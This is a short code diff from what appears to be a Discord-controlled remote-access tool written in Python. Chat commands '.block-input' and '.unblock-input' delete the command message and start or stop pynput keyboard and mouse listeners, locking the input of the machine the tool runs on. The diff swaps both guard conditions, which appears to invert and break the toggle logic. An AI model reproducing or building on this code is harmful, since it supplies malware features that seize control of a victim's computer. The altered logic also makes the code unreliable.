@@ -3,7 +3,7 @@ from pynput import keyboard, mouse
 
 # on message
 elif message.content == '.block-input':
-    if not input_blocked:
+    if input_blocked:
         await message.delete()
     
         async def on_press():
@@ -29,7 +29,7 @@ elif message.content == '.block-input':
         await message.channel.send(embed=embed)
 
 elif message.content == '.unblock-input':
-    if input_blocked:
+    if not input_blocked:
         await message.delete()
         keyboard_listener.stop()
         mouse_listener.stop()
